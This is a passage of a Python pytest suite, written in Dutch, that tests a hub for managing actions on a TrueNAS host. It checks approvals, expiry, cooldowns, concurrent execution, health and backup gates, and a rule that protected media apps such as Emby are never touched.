        r = voer_uit(admin, v)
        assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    assert schrijfaanroepen(nas) == ["app.delete"]


def _naar_executor(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Telt de uitvoerverzoeken die de Hub echt naar de executor stuurt (``POST /api/v1/execute``)."""
    from hub import servicecalls

    echte = servicecalls.call
    gezien: list[str] = []

    def call(base_url: str, method: str, path: str, **kw: Any) -> Any:
        if method == "POST" and path == "/api/v1/execute":
            gezien.append(str((kw.get("body") or {}).get("proposal", {}).get("idempotency_key")))
        return echte(base_url, method, path, **kw)

    monkeypatch.setattr(servicecalls, "call", call)
    return gezien


def test_emby_wordt_ook_met_goedkeuring_nooit_aangeraakt(stack: Stack, monkeypatch: pytest.MonkeyPatch) -> None:
    """Besluit van de gebruiker (Emby blijft tot hij het zelf verwijdert): een goedkeuring heft de Emby-regel niet op.
    Draait er na de goedkeuring Emby onder dezelfde naam, dan weigert de Hub bij het uitvoeren en gaat er niets naar
    de executor. Een voorstel dat meteen op Emby wijst, is daarna niet goed te keuren en niet uit te voeren."""
    admin, nas = stack.admin, stack.nas
    naar_executor = _naar_executor(monkeypatch)
    app = copy.deepcopy(nas.app("my-house"))
    app["name"] = app["id"] = "mediabak"
    nas.data["app.query"].append(app)
    v = stel_voor(admin, "app.uninstall", app_target("mediabak")).json()
    assert v["status"] == "wacht_op_goedkeuring" and v["blokkades"] == [], v
    assert keur_goed(admin, v).status_code == 200
    emby = "docker.io/emby/embyserver:4.9.1.80"
    app["active_workloads"]["images"] = [emby]
    for c in app["active_workloads"]["container_details"]:
        c["image"] = emby
    r = voer_uit(admin, v)
    assert r.status_code == 403 and r.json()["code"] == "actie_geweigerd", r.text
    nu = haal(admin, v)
    assert nu["status"] == "geweigerd" and "emby_nooit_door_platform" in _codes(nu), nu
    assert nu["goedkeuring"]["vervallen_reden"] == "geweigerd" and nu["goedkeuring"]["gebruikt_op"] is None
    for _ in range(2):
        r = keur_goed(admin, v)
        assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
        r = voer_uit(admin, v)
        assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    # Meteen op Emby: geweigerd bij het voorstel, en geen weg om het toch goed te keuren of uit te voeren.
    key = str(uuid.uuid4())
    body = {"action_id": "app.uninstall", "target": app_target("mediabak"), "parameters": {}, "reason": "test"}
    r = admin.post("/api/v1/actions", json=body, headers={"Idempotency-Key": key})
    assert r.status_code == 403 and "emby_nooit_door_platform" in _codes(r.json()["details"]), r.text
    w = haal(admin, key)
    r = admin.post(
        f"/api/v1/actions/{key}/approve",
        json={"preview_hash": "sha256:" + "0" * 64, "resource_etag": "x", "policy_hash": w["policy_hash"]},
        headers=idem(),
    )
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    r = voer_uit(admin, key)
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    assert naar_executor == [] and schrijfaanroepen(nas) == []


# ---------------------------------------------------------------------- gestopte apps: dicht bij twijfel
EMBY_IMAGE = "docker.io/emby/embyserver:4.9.1.80"
GESTOPT = [
    pytest.param("mediaserver", EMBY_IMAGE, "emby", "emby_nooit_door_platform", id="catalogusapp-emby"),
    pytest.param("mediaserver", EMBY_IMAGE, "ix-app", "doel_niet_herkenbaar", id="custom-app-met-emby-image"),
    pytest.param(
        "media-guard", "ghcr.io/lvos04/mediaguard-core:1.2.2", "ix-app", "doel_niet_herkenbaar", id="mediaguard"
    ),
    pytest.param("jellyleon", "ghcr.io/lvos04/jelly-leon:10.11.0", "ix-app", "doel_niet_herkenbaar", id="jelly-leon"),
]
APP_ACTIES = [
    ("app.uninstall", {}),
    ("app.update", {"catalog_version": "1.4.15"}),
    ("app.rollback", {"catalog_version": "1.4.13"}),
    ("app.start", {}),
    ("app.restart", {}),
    ("app.stop", {}),
]


def _gestopte_app(nas: FakeTrueNAS, naam: str, image: str, catalogus: str) -> None:
    """Een gestopte app zoals TrueNAS hem toont: lege ``active_workloads``, dus geen image te zien."""
    from fakes.fake_truenas import _app, _image

    app = _app(naam, "STOPPED", image, 30500, 8096, f"/mnt/testpool/apps/{naam}", "/config", catalog_app=catalogus)
    assert app["active_workloads"]["images"] == []
    nas.data["app.query"].append(app)
    nas.data["app.image.query"].append(_image(image))


@pytest.mark.parametrize(("naam", "image", "catalogus", "code"), GESTOPT)
def test_gestopte_beschermde_app_onder_een_andere_naam_wordt_nooit_aangeraakt(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, naam: str, image: str, catalogus: str, code: str
) -> None:
    """HARDE EIS: TrueNAS toont bij een gestopte app geen image. Een gestopte Emby, MediaGuard of Jelly Leon onder een
    andere appnaam is dan alleen te herkennen aan de catalogusapp (``metadata.name``); lukt ook dat niet, dan kan het
    platform niet uitsluiten dat het een beschermde app is en weigert het elke actie op die app (dicht bij twijfel).
    Niets gaat naar de executor en TrueNAS krijgt geen enkele schrijfaanroep."""
    admin, nas = stack.admin, stack.nas
    naar_executor = _naar_executor(monkeypatch)
    _gestopte_app(nas, naam, image, catalogus)
    for action_id, params in APP_ACTIES:
        key = str(uuid.uuid4())
        body = {"action_id": action_id, "target": app_target(naam), "parameters": params, "reason": "test"}
        r = admin.post("/api/v1/actions", json=body, headers={"Idempotency-Key": key})
        assert r.status_code == 403 and r.json()["code"] == "actie_geweigerd", (action_id, r.text)
        assert code in _codes(r.json()["details"]), (action_id, r.text)
        assert haal(admin, key)["status"] == "geweigerd"
        r = voer_uit(admin, key)
        assert r.status_code == 409 and r.json()["code"] == "status_past_niet", (action_id, r.text)
    assert naar_executor == [] and schrijfaanroepen(nas) == []
    gestopt = nas.app(naam)
    assert gestopt is not None and gestopt["state"] == "STOPPED"


def test_gestopte_custom_app_kan_niet_via_het_platform_starten_een_catalogusapp_wel(stack: Stack) -> None:
    """Tegenproef bij de vorige test. Een Custom App die het platform zelf stopte, toont daarna geen image meer: wat
    erin draait is niet vast te stellen, dus starten via het platform wordt geweigerd. Een gestopte catalogusapp is
    te herkennen aan zijn catalogusnaam (hier ``jellyfin``) en start gewoon (R1)."""
    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.stop", app_target("my-house")).json()
    assert v["risk_class"] == "R2" and keur_goed(admin, v).status_code == 200  # Custom App stoppen: R2
    assert voer_uit(admin, v).status_code == 200 and nas.app("my-house")["state"] == "STOPPED"
    r = stel_voor(admin, "app.start", app_target("my-house"))
    assert r.status_code == 403 and "doel_niet_herkenbaar" in _codes(r.json()["details"]), r.text
    assert schrijfaanroepen(nas) == ["app.stop"]
    r = stel_voor(admin, "app.start", app_target("jellyfin"))
    assert r.status_code == 201 and r.json()["risk_class"] == "R1" and r.json()["blokkades"] == [], r.text
    r = voer_uit(admin, r.json())
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert nas.app("jellyfin")["state"] == "RUNNING" and schrijfaanroepen(nas) == ["app.stop", "app.start"]


@pytest.mark.parametrize("action_id", ["app.stop", "app.restart"])
def test_bekende_naam_met_emby_image_krijgt_ook_de_emby_regel(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, action_id: str
) -> None:
    """ADR-0030 besluit 21: wijst de naam naar een andere bekende app (hier ``jellyfin``) en de image naar Emby, dan
    geldt ook de Emby-regel. Met alleen de eerste herkenning zou dit Jellyfin zijn: R1 en zonder goedkeuring uit te
    voeren. Geweigerd bij het voorstel; er gaat niets naar de executor."""
    from fakes.fake_truenas import _app, _image

    admin, nas = stack.admin, stack.nas
    naar_executor = _naar_executor(monkeypatch)
    nas.data["app.query"] = [a for a in nas.data["app.query"] if a["name"] != "jellyfin"]
    nas.data["app.query"].append(
        _app("jellyfin", "RUNNING", EMBY_IMAGE, 30013, 8096, "/mnt/testpool/apps/jellyfin", "/config")
    )
    nas.data["app.image.query"].append(_image(EMBY_IMAGE))
    key = str(uuid.uuid4())
    body = {"action_id": action_id, "target": app_target("jellyfin"), "parameters": {}, "reason": "test"}
    r = admin.post("/api/v1/actions", json=body, headers={"Idempotency-Key": key})
    assert r.status_code == 403 and r.json()["code"] == "actie_geweigerd", r.text
    assert "emby_nooit_door_platform" in _codes(r.json()["details"]), r.text
    assert haal(admin, key)["status"] == "geweigerd"
    assert voer_uit(admin, key).status_code == 409
    assert naar_executor == [] and schrijfaanroepen(nas) == []


def _gelijktijdig(eerste: Any, tweede: Any, moment: Any, *, tweede_eerst: bool | None = None) -> tuple[Any, Any]:
    """Draai ``eerste()``. Precies vóór de flush waarop ``moment(session)`` waar is, start ``tweede()`` in een eigen
    draad (V-044). Is de tweede binnen 3 s klaar, dan was hij eerst; anders wacht hij op een vergrendeling van de
    eerste en loopt de eerste door. Zo is de volgorde bepaald, niet toevallig. Met ``tweede_eerst`` legt de test die
    volgorde vast: ``True`` = de tweede was klaar terwijl de eerste zijn rij nog vasthield (hij wachtte dus niet)."""
    from sqlalchemy import event
    from sqlalchemy.orm import Session

    uitslag: dict[str, Any] = {}
    draden: list[threading.Thread] = []

    def bij_flush(session: Any, _ctx: Any, _instances: Any) -> None:
        if draden or not moment(session):
            return
        t = threading.Thread(target=lambda: uitslag.__setitem__("tweede", tweede()), daemon=True)
        draden.append(t)
        t.start()
        t.join(timeout=3)
        uitslag["tweede_was_eerst"] = not t.is_alive()

    event.listen(Session, "before_flush", bij_flush)
    try:
        r1 = eerste()
    finally:
        event.remove(Session, "before_flush", bij_flush)
    assert draden, "het moment voor de tweede aanroep is nooit bereikt"
    draden[0].join(timeout=60)
    assert not draden[0].is_alive() and "tweede" in uitslag
    if tweede_eerst is not None:
        assert uitslag["tweede_was_eerst"] is tweede_eerst, (
            "de tweede aanroep was klaar terwijl de eerste zijn rij vasthield"
            if uitslag["tweede_was_eerst"]
            else "de tweede aanroep wachtte op de rij die de eerste vasthield"
        )
    return r1, uitslag["tweede"]


@pytest.mark.parametrize(("action_id", "methode"), [("app.restart", "app.redeploy"), ("app.uninstall", "app.delete")])
def test_gelijktijdig_uitvoeren_gaat_maar_een_keer_naar_de_executor(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, action_id: str, methode: str
) -> None:
    """V-044 en EX20: twee beheerders voeren tegelijk hetzelfde voorstel uit (R1 zonder, R2 met goedkeuring). Precies
    één uitvoering bereikt de executor; de andere krijgt een 409 van de Hub zelf."""
    from hub.models import ActionRequest

    admin, nas = stack.admin, stack.nas
    tweede = login_as(stack.app, "beheerder")
    v = stel_voor(admin, action_id, app_target("my-house")).json()
    if v["goedkeuring_nodig"]:
        assert keur_goed(admin, v).status_code == 200
    naar_executor = _naar_executor(monkeypatch)
    rid = v["request_id"]
    r1, r2 = _gelijktijdig(
        lambda: voer_uit(admin, v),
        lambda: voer_uit(tweede, v),
        lambda s: any(isinstance(o, ActionRequest) and str(o.id) == rid for o in s.dirty),
    )
    uitslagen = sorted([r1, r2], key=lambda r: r.status_code)
    assert [r.status_code for r in uitslagen] == [200, 409], [r1.text, r2.text]
    assert uitslagen[1].json()["code"] in ("goedkeuring_al_gebruikt", "status_past_niet"), uitslagen[1].text
    assert naar_executor == [rid] and schrijfaanroepen(nas) == [methode]
    assert haal(admin, v)["status"] == "uitgevoerd"


def test_afkoeltijd_geldt_ook_voor_twee_voorstellen_tegelijk(stack: Stack, monkeypatch: pytest.MonkeyPatch) -> None:
    """V-044 voor de anti-flap: twee aparte voorstellen om dezelfde app te herstarten, tegelijk uitgevoerd. De
    afkoeltijd per (actie, doel) laat er precies één door; de andere is geblokkeerd en bereikt de executor niet."""
    from hub.models import ActionRequest

    admin, nas = stack.admin, stack.nas
    tweede = login_as(stack.app, "beheerder")
    a = stel_voor(admin, "app.restart", app_target("my-house")).json()
    b = stel_voor(admin, "app.restart", app_target("my-house")).json()
    assert a["status"] == b["status"] == "klaar" and a["blokkades"] == b["blokkades"] == []
    naar_executor = _naar_executor(monkeypatch)
    rid = a["request_id"]
    r1, r2 = _gelijktijdig(
        lambda: voer_uit(admin, a),
        lambda: voer_uit(tweede, b),
        lambda s: any(isinstance(o, ActionRequest) and str(o.id) == rid for o in s.dirty),
    )
    uitslagen = sorted([r1, r2], key=lambda r: r.status_code)
    assert [r.status_code for r in uitslagen] == [200, 409], [r1.text, r2.text]
    assert uitslagen[1].json()["code"] == "actie_geblokkeerd", uitslagen[1].text
    assert "cooldown" in [x["code"] for x in uitslagen[1].json()["details"]["blokkades"]], uitslagen[1].text
    assert len(naar_executor) == 1 and schrijfaanroepen(nas) == ["app.redeploy"]


def test_gelijktijdig_goedkeuren_geeft_een_goedkeuring(stack: Stack) -> None:
    """V-044: twee beheerders keuren tegelijk hetzelfde voorstel goed. Er komt precies één goedkeuring; de tweede
    krijgt 409, net als bij een tweede goedkeuring na elkaar."""
    from sqlalchemy import select

    from hub.models import Approval

    admin = stack.admin
    tweede = login_as(stack.app, "beheerder")
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    rid = v["request_id"]
    r1, r2 = _gelijktijdig(
        lambda: keur_goed(admin, v),
        lambda: keur_goed(tweede, v),
        lambda s: any(isinstance(o, Approval) and str(o.request_id) == rid for o in s.new),
    )
    uitslagen = sorted([r1, r2], key=lambda r: r.status_code)
    assert [r.status_code for r in uitslagen] == [200, 409], [r1.text, r2.text]
    assert uitslagen[1].json()["code"] == "status_past_niet", uitslagen[1].text
    with stack.app.state.sessionmaker() as db:
        rijen = list(db.scalars(select(Approval).where(Approval.request_id == uuid.UUID(rid))))
    assert len(rijen) == 1 and rijen[0].vervallen_op is None, [(a.vervallen_reden, a.used_at) for a in rijen]
    assert voer_uit(admin, v).status_code == 200 and schrijfaanroepen(stack.nas) == ["app.delete"]


def test_verlopen_goedkeuring_telt_niet(stack: Stack) -> None:
    from hub.models import Approval
    from hub.timeutil import utcnow

    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    assert keur_goed(admin, v).status_code == 200
    with stack.app.state.sessionmaker() as db:
        for ap in db.query(Approval).all():
            ap.approved_at = utcnow() - timedelta(minutes=16)
            ap.expires_at = utcnow() - timedelta(minutes=1)
        db.commit()
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_nodig", r.text
    nu = haal(admin, v)
    assert nu["status"] == "wacht_op_goedkeuring" and nu["goedkeuring"]["vervallen_reden"] == "verlopen"
    assert schrijfaanroepen(nas) == [] and "action.approval.expired" in audit_acties(stack.app)


def test_veeg_in_een_leesroute_schrijft_niet_over_een_uitvoering_heen(
    stack: Stack, monkeypatch: pytest.MonkeyPatch
) -> None:
    """ADR-0030 besluit 23: terwijl een uitvoering de rij van het verzoek vasthoudt, verloopt de goedkeuring en vraagt
    iemand de lijst op. De veeg in die leesroute wacht niet op de uitvoering en schrijft er niets overheen: een
    gebruikte goedkeuring is nooit ook "verlopen", en een verzoek verlaat "bezig" alleen via de uitvoerende
    transactie. (De goedkeuring is inmiddels verlopen; de eigen controle van de Hub stuurt dan niets naar de
    executor.)"""
    from sqlalchemy import select, update

    from hub.models import ActionRequest, Approval
    from hub.timeutil import utcnow

    admin, nas = stack.admin, stack.nas
    lezer = login_as(stack.app, "beheerder")
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    assert keur_goed(admin, v).status_code == 200
    naar_executor = _naar_executor(monkeypatch)
    rid = uuid.UUID(v["request_id"])

    def verlopen_en_lijst_lezen() -> Any:
        with stack.app.state.sessionmaker() as db:
            db.execute(
                update(Approval).where(Approval.request_id == rid).values(expires_at=utcnow() - timedelta(seconds=5))
            )
            db.commit()
        return lezer.get("/api/v1/actions")

    # tweede_eerst=True: de leesroute was klaar terwijl de uitvoering de rij nog vasthield (FOR UPDATE SKIP LOCKED);
    # met een wachtende FOR UPDATE zou de leesroute pas na de uitvoering klaar zijn en is deze test rood.
    r1, r2 = _gelijktijdig(
        lambda: voer_uit(admin, v),
        verlopen_en_lijst_lezen,
        lambda s: any(isinstance(o, ActionRequest) and o.id == rid for o in s.dirty),
        tweede_eerst=True,
    )
    assert r2.status_code == 200, r2.text
    assert r1.status_code == 409 and r1.json()["code"] == "uitvoering_geweigerd", r1.text
    assert r1.json()["details"]["code"] == "goedkeuring_verlopen", r1.text
    with stack.app.state.sessionmaker() as db:
        rijen = list(db.scalars(select(Approval).where(Approval.request_id == rid)))
    assert len(rijen) == 1 and rijen[0].used_at is not None, rijen
    assert rijen[0].vervallen_op is None and rijen[0].vervallen_reden is None, (
        rijen[0].vervallen_op,
        rijen[0].vervallen_reden,
    )
    assert "action.approval.expired" not in audit_acties(stack.app)
    nu = haal(admin, v)
    assert nu["status"] == "mislukt" and nu["resultaat"]["code"] == "goedkeuring_verlopen", nu
    assert naar_executor == [] and schrijfaanroepen(nas) == []


def test_afwijzen_en_verlopen_voorstel(stack: Stack) -> None:
    from hub.models import ActionRequest
    from hub.timeutil import utcnow

    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    r = admin.post(f"/api/v1/actions/{v['request_id']}/reject", json={"reden": "niet nu"}, headers=idem())
    assert r.status_code == 200 and r.json()["status"] == "afgewezen", r.text
    assert keur_goed(admin, v).status_code == 409 and voer_uit(admin, v).status_code == 409
    w = stel_voor(admin, "app.stop", app_target("my-house"), expires_in_seconds=60).json()
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(w["request_id"]))
        rij.geldig_tot = utcnow() - timedelta(seconds=1)
        db.commit()
    r = voer_uit(admin, w)
    assert r.status_code == 409 and r.json()["code"] == "voorstel_verlopen", r.text
    assert haal(admin, w)["status"] == "verlopen" and schrijfaanroepen(nas) == []
    items = admin.get("/api/v1/actions", params={"status": "open"}).json()["items"]
    assert items == []


# ---------------------------------------------------------------------- blokkades op de gemeten toestand
@pytest.mark.parametrize("toestand", ["DEGRADED", "FAULTED", "niet_healthy"])
def test_pool_niet_gezond_blokkeert_opslagmutaties_ook_met_goedkeuring(stack: Stack, toestand: str) -> None:
    """EX11."""
    admin, nas = stack.admin, stack.nas
    # Goedgekeurd terwijl de pool nog gezond was …
    v = stel_voor(admin, "app.install", app_target("demo-app"), install_params("demo-app")).json()
    assert v["blokkades"] == [] and keur_goed(admin, v).status_code == 200
    pool = nas.data["pool.query"][0]
    if toestand == "niet_healthy":
        pool["healthy"] = False
    else:
        pool["status"], pool["healthy"] = toestand, False
    stack.vernieuw()
    # … maar een blokkade geldt óók met goedkeuring.
    _geblokkeerd(voer_uit(admin, v), "pool_niet_gezond")
    snap = stel_voor(
        admin,
        "zfs.snapshot.create",
        {"host_id": "nas-primary", "dataset": "testpool/apps/mediaguard"},
        {"naam": "asm-proef"},
    )
    assert snap.status_code == 201 and "pool_niet_gezond" in _codes(snap.json()), snap.text
    _geblokkeerd(voer_uit(admin, snap.json()), "pool_niet_gezond")
    nieuw = stel_voor(admin, "app.install", app_target("andere-app"), install_params("andere-app")).json()
    assert "pool_niet_gezond" in _codes(nieuw)
    _geblokkeerd(keur_goed(admin, nieuw), "pool_niet_gezond")
    assert schrijfaanroepen(nas) == [] and nas.created == []
    # Geen opslagmutatie en R1: een app herstarten mag nog wel.
    r = voer_uit(admin, stel_voor(admin, "app.restart", app_target("my-house")).json())
    assert r.status_code == 200 and schrijfaanroepen(nas) == ["app.redeploy"], r.text


@pytest.mark.parametrize("backup", ["geen", "oud"])
def test_backup_gate_rood_blokkeert_opslagmutaties(stack: Stack, backup: str) -> None:
    """EX12."""
    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.install", app_target("demo-app"), install_params("demo-app")).json()
    assert keur_goed(admin, v).status_code == 200
    stack.toestand.backup = backup
    _geblokkeerd(voer_uit(admin, v), "backup_gate_rood")
    snap = stel_voor(
        admin,
        "zfs.snapshot.create",
        {"host_id": "nas-primary", "dataset": "testpool/apps/mediaguard"},
        {"naam": "asm-proef"},
    ).json()
    assert _codes(snap) == ["backup_gate_rood"]
    _geblokkeerd(voer_uit(admin, snap), "backup_gate_rood")
    assert schrijfaanroepen(nas) == []
    # Zodra de gate weer groen is, kan het (zelfde goedkeuring: er is niets aan de gebonden velden veranderd).
    stack.toestand.backup = "vers"
    r = voer_uit(admin, v)
    assert r.status_code == 200 and schrijfaanroepen(nas) == ["app.create"], r.text


def test_zonder_geteste_besluiten_geen_r2_en_geen_opslagmutatie(stack: Stack) -> None:
    """De echte toestand zonder testinvoer: besluiten Open, geen geverifieerde Hub-back-up."""
    admin, nas = stack.admin, stack.nas
    stack.toestand.besluiten, stack.toestand.backup = None, "echt"
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    assert {"backup_gate_rood", "gate_dicht"} <= set(_codes(v))
    _geblokkeerd(keur_goed(admin, v), "backup_gate_rood")
    assert schrijfaanroepen(nas) == []


def _teken_spion(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Telt elke handtekening die de Hub onder een ``ExecutionRequest`` zet (de echte functie blijft werken)."""
    from hub.actions import service

    getekend: list[str] = []
    echt = service.execreq.sign

    def spion(envelope: Any, key: Any) -> Any:
        getekend.append("ExecutionRequest")
        return echt(envelope, key)

    monkeypatch.setattr(service.execreq, "sign", spion)
    return getekend


def _voor_gate(stack: Stack, gate: str) -> dict[str, Any]:
    """Een uitvoerbaar voorstel dat precies deze gate nodig heeft, goedgekeurd terwijl alles nog open is."""
    admin = stack.admin
    if gate == "r2_r3_acties":
        v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    elif gate == "data_mutatie":
        v = stel_voor(
            admin, "zfs.snapshot.create", {"host_id": "nas-primary", "dataset": "testpool/apps"}, {"naam": "gate"}
        ).json()
    elif gate == "deployment":
        v = stel_voor(admin, "app.install", app_target("demo-app"), install_params("demo-app")).json()
    else:  # bestaande_app_updates: met een eigen, geverifieerd checkpoint, zodat alleen de gate in de weg kan staan
        _demo_dataset(stack)
        assert voer_uit(admin, _installeer(stack)).status_code == 200
        stack.vernieuw()
        _snapshot(stack, "testpool/apps/demo-app", "voor-update")
        nieuw = {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}}
        v = stel_voor(admin, "app.update", app_target("demo-app"), nieuw).json()
    assert v["blokkades"] == [], v
    if v["risk_class"] in ("R2", "R3"):
        assert keur_goed(admin, v).status_code == 200
    return dict(v)


@pytest.mark.parametrize(
    ("gate", "sluit", "code"),
    [
        ("r2_r3_acties", {"backup": "oud"}, "backup_gate_rood"),
        ("data_mutatie", {"D06": "Ingevuld"}, "gate_dicht"),
        ("deployment", {"D03": "Ingevuld"}, "gate_dicht"),
        ("bestaande_app_updates", {"D07": "Ingevuld"}, "gate_dicht"),
    ],
)
def test_dichte_gate_ondertekent_niets(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, gate: str, sluit: dict[str, str], code: str
) -> None:
    """S-P2-060 bouwpunt 1 (ADR-0030 besluit 11): per gate een actie die al is goedgekeurd. Gaat de gate dicht, dan
    zet de Hub geen handtekening, verbruikt hij de goedkeuring niet en gaat er niets naar de executor of de NAS. Gaat
    de gate weer open, dan ondertekent dezelfde route wel (de spion telt echt)."""
    admin, nas = stack.admin, stack.nas
    v = _voor_gate(stack, gate)
    schrijf_voor = list(schrijfaanroepen(nas))
    getekend = _teken_spion(monkeypatch)
    besluiten = dict(stack.toestand.besluiten or {})
    for did, status in sluit.items():
        if did == "backup":
            stack.toestand.backup = status
        else:
            stack.toestand.besluiten = {**besluiten, did: (status, None)}
    r = voer_uit(admin, v)
    _geblokkeerd(r, code)
    blok = next(b for b in r.json()["details"]["blokkades"] if b["code"] == code)
    assert blok["reden"] and blok["details"], blok  # vaste code met een Nederlandse uitleg
    assert getekend == [] and schrijfaanroepen(nas) == schrijf_voor
    rij = _rij(stack.app, v["request_id"])
    assert rij.gestart_op is None and rij.execution_nonce is None
    assert haal(admin, v)["status"] in ("klaar", "goedgekeurd")
    # Weer open: dezelfde goedkeuring is nog bruikbaar en nu wordt er wel ondertekend en uitgevoerd.
    stack.toestand.besluiten, stack.toestand.backup = besluiten, "vers"
    r = voer_uit(admin, v)
    assert r.status_code == 200, r.text
    assert len(getekend) == 1 and len(schrijfaanroepen(nas)) > len(schrijf_voor)


def test_beheerder_kan_een_gate_niet_wegklikken(stack: Stack, monkeypatch: pytest.MonkeyPatch) -> None:
    """S-P2-060 (B12-006, ADR-0030 besluit 11): er is geen schrijfroute voor gates, een goedkeuring met extra velden
    bestaat niet en een beheerder kan een ongezonde pool niet overrulen. Er wordt niets ondertekend."""
    admin, nas = stack.admin, stack.nas
    gates = {p: set(m) for p, m in stack.app.openapi()["paths"].items() if p.startswith("/api/v1/gates")}
    assert gates and all(m == {"get"} for m in gates.values()), gates
    for methode in ("post", "put", "patch", "delete"):
        for pad in ("/api/v1/gates", "/api/v1/gates/data_mutatie", "/api/v1/gates/data_mutatie/override"):
            r = getattr(admin, methode)(
                pad, headers=idem(), **({} if methode == "delete" else {"json": {"open": True}})
            )
            assert r.status_code in (404, 405), (methode, pad, r.status_code)
    v = stel_voor(admin, "app.install", app_target("demo-app"), install_params("demo-app")).json()
    assert keur_goed(admin, v).status_code == 200
    nas.data["pool.query"][0]["healthy"] = False
    stack.vernieuw()
    getekend = _teken_spion(monkeypatch)
    for extra in ({"blokkades_negeren": True}, {"gate": "open"}, {"override": True}):
        r = keur_goed(admin, haal(admin, v), **extra)  # type: ignore[arg-type]
        assert r.status_code in (409, 422) and r.status_code != 200, r.text
    _geblokkeerd(voer_uit(admin, v), "pool_niet_gezond")
    assert admin.get("/api/v1/gates/data_mutatie").json()["status"] == "geblokkeerd"
    assert getekend == [] and schrijfaanroepen(nas) == []


@pytest.mark.parametrize(
    ("meting", "code"),
    [
        ("pool-tegenstrijdig", "pool_niet_gezond"),
        ("pool-vlag-ontbreekt", "pool_niet_gezond"),
        ("pool-in-de-toekomst", "pool_niet_gezond"),
        ("export-afgekeurd", "backup_gate_rood"),
    ],
)
def test_ongeldige_meting_stopt_voor_ondertekening(
    stack: Stack, settings: Any, monkeypatch: pytest.MonkeyPatch, meting: str, code: str
) -> None:
    """R-VEILIG-1 t/m -3 (S-P2-060): een gate gaat alleen open op aantoonbaar geldige, verse gegevens. Een
    tegenstrijdige of onvolledige poolrij, een meettijd in de toekomst of een export waarvan de herverificatie
    mislukte (dump_missing) stopt een al goedgekeurde actie vóór ondertekening. Een andere verse, geverifieerde
    export opent de back-upgate weer."""
    from sqlalchemy import select

    from hub.models import InventorySnapshot, SelfBackup

    admin, nas = stack.admin, stack.nas
    if meting == "export-afgekeurd":
        assert admin.post("/api/v1/backups/self", headers=idem()).status_code == 202
        assert stack.worker_once()[-1]["status"] == "geslaagd"
        stack.toestand.backup = "echt"
    v = stel_voor(admin, "app.install", app_target("demo-app"), install_params("demo-app")).json()
    assert v["blokkades"] == [] and keur_goed(admin, v).status_code == 200
    if meting == "pool-tegenstrijdig":
        nas.data["pool.query"][0]["status"] = "DEGRADED"  # healthy blijft true
        stack.vernieuw()
    elif meting == "pool-vlag-ontbreekt":
        del nas.data["pool.query"][0]["healthy"]
        stack.vernieuw()
    elif meting == "pool-in-de-toekomst":
        with stack.app.state.sessionmaker() as db:
            for rij in db.scalars(select(InventorySnapshot).where(InventorySnapshot.kind == "pools")):
                rij.observed_at += timedelta(days=1)
            db.commit()
    else:
        with stack.app.state.sessionmaker() as db:
            export = db.scalars(select(SelfBackup)).one()
        (settings.backups_dir / export.file_name).rename(settings.backups_dir / (export.file_name + ".weg"))
        r = admin.post(f"/api/v1/backups/self/{export.id}/verify", headers=idem())
        assert r.status_code == 200 and r.json()["reason_code"] == "dump_missing", r.text
    getekend = _teken_spion(monkeypatch)
    _geblokkeerd(voer_uit(admin, v), code)
    assert getekend == [] and schrijfaanroepen(nas) == []
    if meting == "export-afgekeurd":
        assert admin.post("/api/v1/backups/self", headers=idem()).status_code == 202
        assert stack.worker_once()[-1]["status"] == "geslaagd"
        r = voer_uit(admin, v)
        assert r.status_code == 200, r.text
        assert len(getekend) == 1


def _snapshot(stack: Stack, dataset: str, naam: str, recursief: bool = True) -> dict[str, Any]:
    """Een checkpoint via de echte route: ``zfs.snapshot.create`` (R1) door de Hub en de executor."""
    v = stel_voor(
        stack.admin,
        "zfs.snapshot.create",
        {"host_id": "nas-primary", "dataset": dataset},
        {"naam": naam, "recursief": recursief},
    )
    assert v.status_code == 201 and v.json()["blokkades"] == [], v.text
    r = voer_uit(stack.admin, v.json())
    assert r.status_code == 200 and r.json()["resultaat"]["waarschuwingen"] == [], r.text
    return dict(v.json())


def _demo_dataset(stack: Stack) -> None:
    """Een eigen dataset voor demo-app (zoals een beheerder hem aanmaakt): drie datasets dekken dan de app."""
    apps = stack.nas.datasets()["testpool/apps"]
    apps["children"].append({**apps["children"][0], "id": "testpool/apps/demo-app", "name": "testpool/apps/demo-app",
                             "mountpoint": "/mnt/testpool/apps/demo-app", "children": []})  # fmt: skip


def test_bijwerken_vraagt_een_geverifieerd_herstelpunt(stack: Stack) -> None:
    """``requires_backup`` en de pre-update-gate (S-P2-050f): zonder eigen, geverifieerd checkpoint geen update. Het
    checkpoint is een snapshot die Hub en executor zelf maakten via de echte route, vers, na de laatste wijziging van
    de app en op een dataset die de opslag van de app dekt. Geen teststub van ``verified_checkpoint``."""
    admin, nas = stack.admin, stack.nas
    _demo_dataset(stack)
    assert voer_uit(admin, _installeer(stack)).status_code == 200
    stack.vernieuw()
    nieuw = {"image": {"repository": REPO, "tag": f"1.2.4@{DIGEST_B}"}}
    v = stel_voor(admin, "app.update", app_target("demo-app"), nieuw).json()
    assert v["risk_class"] == "R2" and _codes(v) == ["backup_checkpoint_ontbreekt"]
    assert v["blokkades"][0]["details"] == ["geen_passend_checkpoint"]
